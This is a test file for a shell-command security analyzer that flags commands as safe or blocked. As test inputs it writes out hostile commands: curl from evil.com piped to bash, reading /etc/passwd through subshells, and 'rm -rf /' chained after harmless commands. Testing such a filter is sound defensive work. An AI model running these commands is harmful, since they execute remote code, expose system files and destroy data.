import { ASTAnalyzer } from '../../src/security/ast-analyzer';

describe('ASTAnalyzer', () => {
  let analyzer: ASTAnalyzer;

  beforeEach(() => {
    analyzer = new ASTAnalyzer();
  });

  it('should allow safe commands', () => {
    const result = analyzer.analyzeCommand('ls -la /var/log');
    expect(result.isSafe).toBe(true);
  });

  it('should allow normal pipes', () => {
    const result = analyzer.analyzeCommand('cat /var/log/syslog | grep "error" | wc -l');
    expect(result.isSafe).toBe(true);
  });

  describe('Shell evasion techniques', () => {
    it('should block subshells with $()', () => {
      const result = analyzer.analyzeCommand('echo $(cat /etc/passwd)');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Subshells and process substitutions are blocked');
    });

    it('should block subshells with backticks', () => {
      const result = analyzer.analyzeCommand('echo `cat /etc/passwd`');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Subshells and process substitutions are blocked');
    });

    it('should block piping to bash', () => {
      const result = analyzer.analyzeCommand('curl -s https://evil.com/malware.sh | bash');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Piping to non-allowlisted command');
    });

    it('should block piping to absolute path bash', () => {
      const result = analyzer.analyzeCommand('curl -s https://evil.com/malware.sh | /bin/bash');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Piping to non-allowlisted command');
    });
    
    it('should block piping to a subshell', () => {
      const result = analyzer.analyzeCommand('curl -s https://evil.com/malware.sh | (bash)');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('subshell');
    });

    it('should block semicolon chained destructive commands', () => {
      const result = analyzer.analyzeCommand('echo safe ; rm -rf /');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Destructive root deletion blocked');
    });

    it('should block logical AND chained destructive commands', () => {
      const result = analyzer.analyzeCommand('echo safe && rm -rf /etc');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Destructive root deletion blocked');
    });
  });

  describe('Destructive commands', () => {
    it('should block rm -rf /', () => {
      const result = analyzer.analyzeCommand('rm -rf /');
      expect(result.isSafe).toBe(false);
    });

    it('should block absolute rm --recursive /etc', () => {
      const result = analyzer.analyzeCommand('/bin/rm --recursive /etc');
      expect(result.isSafe).toBe(false);
    });

    it('should allow rm on safe paths', () => {
      const result = analyzer.analyzeCommand('rm -rf ./tmp-folder');
      expect(result.isSafe).toBe(true);
    });
  });
});
